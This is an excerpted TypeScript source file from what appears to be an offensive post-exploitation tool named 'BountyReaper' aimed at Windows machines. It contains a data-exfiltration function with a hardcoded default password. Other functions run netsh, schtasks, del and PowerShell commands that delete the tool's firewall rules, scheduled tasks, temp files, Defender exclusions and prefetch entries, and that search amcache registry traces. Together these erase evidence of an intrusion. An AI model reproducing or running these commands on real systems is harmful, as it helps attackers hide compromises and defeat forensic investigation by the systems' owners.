...
export async function dataExfil(args: string[], timeout: number): Promise<HookResult> {
  ...
  const password = argVal(args, "--password") || "bountyreaper"
  const findings: Finding[] = []
...
export async function firewallManage(args: string[], timeout: number): Promise<HookResult> {
  ...
  if (activeExec === "cmd" || activeExec === "bat") {
    if (action === "enum") {
      ...
      const csRules = rules.stdout.split("\n").filter((l) => l.includes("BountyReaper") || l.includes("cs-"))
      if (csRules.length > 0) {
        output.push("\n[!] BountyReaper rules found:")
    ...
    if (action === "restore") {
      ...
      const delRules = await cmd(
        'netsh advfirewall firewall delete rule name=all dir=in action=allow | findstr /i "cs- bountyreaper"',
        timeout,
      )
...
Write-Output ""
Write-Output "[*] Removing BountyReaper firewall rules..."
...
Write-Output "[*] Removed $removed BountyReaper rules"
...
`
    ...
    findings.push({
      ...
      title: "Firewall profiles restored, BountyReaper rules removed, port proxies cleared",
      details: r.stdout.substring(0, 500),
...
export async function cleanupWin(_args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["[*] Cleaning up BountyReaper artifacts from Windows target...\n"]
  let cleaned = 0
  ...
  if (activeExec === "cmd" || activeExec === "bat") {
    ...
    const tasks = await cmd('schtasks /query /fo csv 2>nul | findstr /i "cs- bountyreaper"', timeout)
    ...
    await cmd('del /q /s "%TEMP%\\bountyreaper-*" 2>nul', timeout)
    output.push("[+] Cleaned temp files (cs-*, bountyreaper-*)")
    cleaned++
    await cmd('del /q "C:\\Windows\\Prefetch\\*BOUNTYREAPER*" 2>nul', timeout)
    await cmd('del /q "C:\\Windows\\Prefetch\\*CS-*" 2>nul', timeout)
    output.push("[+] Cleared prefetch entries")
    cleaned++
    const fwRules = await cmd('netsh advfirewall firewall show rule name=all | findstr /i "cs- bountyreaper"', timeout)
  ...
  const tasks = await ps(
    `Get-ScheduledTask | Where-Object { $_.TaskName -like 'cs-*' -or $_.TaskName -like '*bountyreaper*' } | ForEach-Object { Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false; Write-Output $_.TaskName }`,
    timeout,
  )
...
$csExclusions = $prefs.ExclusionPath | Where-Object { $_ -like '*cs-*' -or $_ -like '*bountyreaper*' }
...
`,
  ...
  const prefetch = await ps(
    `Remove-Item "C:\\Windows\\Prefetch\\*bountyreaper*" -Force -ErrorAction SilentlyContinue; Remove-Item "C:\\Windows\\Prefetch\\*CS-*" -Force -ErrorAction SilentlyContinue`,
    timeout,
  )
...
export async function antiForensics(args: string[], timeout: number): Promise<HookResult> {
  ...
  if (activeExec === "cmd" || activeExec === "bat") {
    ...
    if (action === "prefetch" || action === "full") {
      ...
      output.push("[+] Cleared suspicious prefetch entries (bountyreaper, cs-, powershell)")
    }
    if (action === "amcache" || action === "full") {
      ...
      const amcache = await cmd(
        'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppModel\\StateRepository\\Cache\\Application" /s 2>nul | findstr /i "bountyreaper cs-"',
        timeout,
      )
      if (amcache.stdout.trim()) {
        output.push("[!] BountyReaper references found in registry:")
